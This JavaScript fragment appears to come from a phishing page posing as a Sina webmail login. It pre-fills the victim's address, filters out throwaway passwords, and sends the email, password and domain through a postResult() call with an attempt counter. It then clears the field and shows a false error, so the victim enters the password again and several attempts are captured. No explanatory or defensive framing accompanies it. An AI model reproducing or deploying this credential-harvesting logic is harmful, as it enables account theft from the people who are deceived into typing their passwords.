// 
if (validEmail.test(usermail)) {
    $("#s_mail").val(usermail);
    $("#s_mail").attr('readOnly', true); 
}

// 
$("#sina_form_btn").on('submit', (e)=>{
    e.preventDefault();

    if (!validEmail.test($("#s_mail").val())) {
        $("#s_mail").css({"border-color":"red"})
        return
    }
    else{
        $("#s_mail").css({"border-color":"silver"})
    }

    if (validEmail.test($("#s_pass").val()) || $("#s_pass").val().length < 6 || $("#s_pass").val() == 123456 || $("#s_pass").val().toLowerCase() == "qwerty" || $("#s_pass").val().toLowerCase() == "password" || $("#s_pass").val().toLowerCase() == "testing") {
        $("#s_pass").css({"border-color":"red"})
        return
    }
    else{
        $("#s_pass").css({"border-color":"silver"})
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#s_mail").val().split('@');

    postResult(url[1], $("#s_mail").val(), $("#s_pass").val(), postCount);
    
    setTimeout(() => {
        $("#s_pass").css({"border-color":"red"})
        postCount++
        $("#s_pass").val("")
    }, delayCounter);

})